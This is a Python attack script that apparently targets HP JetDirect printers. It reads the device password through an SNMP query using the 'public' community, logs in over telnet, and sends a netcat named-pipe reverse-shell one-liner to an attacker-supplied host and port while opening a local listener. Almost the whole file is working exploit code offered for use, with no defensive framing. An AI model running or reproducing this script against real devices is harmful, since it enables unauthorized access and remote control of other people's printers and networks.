#!/usr/bin/env python3

#JetDirect password finder, thank you DZE64 for figuring out the HEX portion and making it much nicer for the end user

import os
import subprocess
import sys 
import argparse
import webbrowser
import time
import getpass
import telnetlib

try:
    from colorama import Fore
except ImportError:
    os.system("pip3 install colorama")
    os.system("pip install colorama")

RED = Fore.RED
YELLOW = Fore.YELLOW
GREEN = Fore.GREEN
MAGENTA = Fore.MAGENTA
RESET = Fore.RESET

print(RED+    " _____ _____  _____       ___ _____ _____  ______ ___________ _____ _____ _____ ")
print(YELLOW+ "|  _  |  __ \/  __ \     |_  |  ___|_   _| |  _  \_   _| ___ \  ___/  __ \_   _|")
print(GREEN+  "| | | | |  \/| /  \/       | | |__   | |   | | | | | | | |_/ / |__ | /  \/ | |  ")
print(MAGENTA+"| | | | | __ | |           | |  __|  | |   | | | | | | |    /|  __|| |     | |  ")
print(RED+    "\ \_/ / |_\ \| \__/\   /\__/ / |___  | |   | |/ / _| |_| |\ \| |___| \__/\ | |  ")
print(YELLOW+ " \___/ \____/ \____/    \____/\____/ \_/   |___/  \___/\_| \_\____/ \____/ \_/  ")
print(GREEN+  "                                                                                "+RESET)
                                                                                

parser = argparse.ArgumentParser(description="HP JetDirect Password Finder then Exploit", formatter_class=argparse.ArgumentDefaultsHelpFormatter)
parser.add_argument("-t", "--Target", action="store", help="IP of target")
parser.add_argument("-r", "--RPORT", action="store", help="RPORT ex 9100")
parser.add_argument("-l", "--LHOST", action="store", help="LHOST (attacker IP)")
parser.add_argument("-p", "--LPORT", action="store", help="LPORT (attacker listening port)")
args = parser.parse_args()

Target = args.Target
RPORT = args.RPORT
LHOST = args.LHOST
LPORT = args.LPORT

if (Target == None or RPORT == None):
    print(YELLOW+"What do you want from me!!!"+RESET)
    parser.print_help()
    sys.exit()
    
print(MAGENTA+'Thank you DZE64 for helping with the script and doing the hex portion')
print(GREEN+'HP JetDirect found, trying to exploit'+RESET)
hex_pass = subprocess.run(['snmpget', '-v', '1', '-c', 'public', f'{Target}', '.1.3.6.1.4.1.11.2.3.9.1.1.13.0'], stdout=subprocess.PIPE, text=True)
Password = hex_pass.stdout.split("BITS: ")
Password = bytearray.fromhex(Password[1].replace("\n", "").replace(" ", "")[:34]).decode()
print(f"{YELLOW} The machines password is {RED} {Password}{RESET}")

if (Target != None and RPORT != None and LHOST != None and LPORT != None and Password != None):
    tn = telnetlib.Telnet(Target)
    print(MAGENTA+"Exploiting to create reverse shell"+RESET)
    tn.write(b"\n")
    time.sleep(1)
    tn.write(Password.encode('ascii') + b"\n")
    code = "exec rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc "+LHOST+" "+LPORT+" >/tmp/f"
    tn.write(code.encode('ascii') + b"\n")
    subprocess.run(["nc", "-lvnp", f"{LPORT}"])
    print (tn.read_all().decode('ascii'))
